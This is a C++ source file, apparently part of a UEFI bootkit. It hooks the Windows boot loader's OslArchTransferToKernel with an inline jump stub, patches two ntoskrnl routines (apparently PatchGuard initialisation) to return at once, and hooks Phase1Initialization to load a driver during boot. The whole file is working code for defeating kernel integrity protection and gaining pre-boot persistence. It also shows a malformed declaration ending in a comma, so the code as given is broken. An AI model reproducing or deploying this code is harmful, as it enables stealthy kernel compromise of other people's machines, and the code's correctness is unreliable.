#include "hooks.hpp"
#include "loader.hpp"
#include "utils.hpp"

unsigned char Shell[]{
	0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // movabs rax, Address
	0xFF, 0xE0,													// jmp rax
};

static tOslArchTransferToKernel OslArchTransferToKernelOriginal;
static unsigned char OslArchTransferToKernelShell[12];

static tPhase1Initialization Phase1InitializationOriginal;
static unsigned char Phase1InitializationShell[12];

static void* KeInitAmd64SpecificState,
static void* ExpLicenseWatchInitWorker;

static PLDR_DATA_TABLE_ENTRY Ntoskrnl;

void Phase1InitializationHook(void* StartContext) {
	Utils::MemCpy(Phase1InitializationOriginal, Phase1InitializationShell, 12);

	// Waiting for function
	Phase1InitializationOriginal(StartContext);

	// Restoring original bytes in nt!KeInitAmd64SpecificState and nt!ExpLicenseWatchInitWorker
	if (KeInitAmd64SpecificState)
		Utils::MemCpy(KeInitAmd64SpecificState, (void*)"\x48", 1);
	if (ExpLicenseWatchInitWorker)
		Utils::MemCpy(ExpLicenseWatchInitWorker, (void*)"\x48", 1);

	Loader::LoadDriver(Ntoskrnl);
}

// KernelEntrypoint (OslEntryPoint) -> nt!KiSystemStartup
void OslArchTransferToKernelHook(PLOADER_PARAMETER_BLOCK LoaderBlock, void* KernelEntrypoint) {
	Utils::MemCpy(OslArchTransferToKernelOriginal, OslArchTransferToKernelShell, 12);

	// Getting ntoskrnl entry
	Ntoskrnl = (PLDR_DATA_TABLE_ENTRY)LoaderBlock->LoadOrderListHead.Flink;

	// Searching for nt!Phase1Initialization
	Phase1InitializationOriginal = (tPhase1Initialization)Utils::SignatureScan(Ntoskrnl->DllBase,
		"\x48\x89\x5C\x24\x00\x57\x48\x83\xEC\x30\x48\x8B\xD9\x33\xC9", "xxxx?xxxxxxxxxx", 15, Ntoskrnl->SizeOfImage);
	if (Phase1InitializationOriginal == nullptr)
		return OslArchTransferToKernelOriginal(LoaderBlock, KernelEntrypoint);

	// Searching for nt!KeInitAmd64SpecificState
	KeInitAmd64SpecificState = Utils::SignatureScan(Ntoskrnl->DllBase, 
		"\x48\x83\xEC\x28\x0F\xAE\xE8", "xxxxxxx", 7, Ntoskrnl->SizeOfImage);
	if (KeInitAmd64SpecificState == nullptr)
		return OslArchTransferToKernelOriginal(LoaderBlock, KernelEntrypoint);

	// Searching for nt!ExpLicenseWatchInitWorker
	ExpLicenseWatchInitWorker = Utils::SignatureScan(Ntoskrnl->DllBase, 
		"\x57\x48\x83\xEC\x30\x0F\xAE\xE8", "xxxxxxxx", 8, Ntoskrnl->SizeOfImage);
	if (ExpLicenseWatchInitWorker == nullptr)
		return OslArchTransferToKernelOriginal(LoaderBlock, KernelEntrypoint);
	ExpLicenseWatchInitWorker = (void*)((UINT64)ExpLicenseWatchInitWorker - 10);

	*(char*)(KeInitAmd64SpecificState) = 0xC3;
	*(char*)(ExpLicenseWatchInitWorker) = 0xC3;

	// Installing winload!OslArchTransferToKernel hook
	void* Phase1InitializationHookPointer = Phase1InitializationHook;
	g_ST->RuntimeServices->ConvertPointer(EFI_OPTIONAL_PTR, &Phase1InitializationHookPointer);

	*(UINT64*)&Shell[2] = (UINT64)Phase1InitializationHookPointer;
	Utils::MemCpy(Phase1InitializationShell, Phase1InitializationOriginal, 12);
	Utils::MemCpy(Phase1InitializationOriginal, Shell, 12);

	return OslArchTransferToKernelOriginal(LoaderBlock, KernelEntrypoint);
}

void Hook::OslArchTransferToKernel(void* Address) {
	// Searching for winload!OslArchTransferToKernel
	OslArchTransferToKernelOriginal = (tOslArchTransferToKernel)Utils::SignatureScan(Address, 
		"\x33\xF6\x4C\x8B\xE1\x4C\x8B\xEA\x0F\x09", "xxxxxxxxxx", 10, 0x300000);
	if (OslArchTransferToKernelOriginal == nullptr)
		return;
	g_ST->RuntimeServices->ConvertPointer(EFI_OPTIONAL_PTR, (void**)&OslArchTransferToKernelOriginal);

	// Installing winload!OslArchTransferToKernel hook
	void* NewPointer = OslArchTransferToKernelHook;
	g_ST->RuntimeServices->ConvertPointer(EFI_OPTIONAL_PTR, &NewPointer);

	*(UINT64*)&Shell[2] = (UINT64)NewPointer;
	Utils::MemCpy(OslArchTransferToKernelShell, OslArchTransferToKernelOriginal, 12);
	Utils::MemCpy(OslArchTransferToKernelOriginal, Shell, 12);
}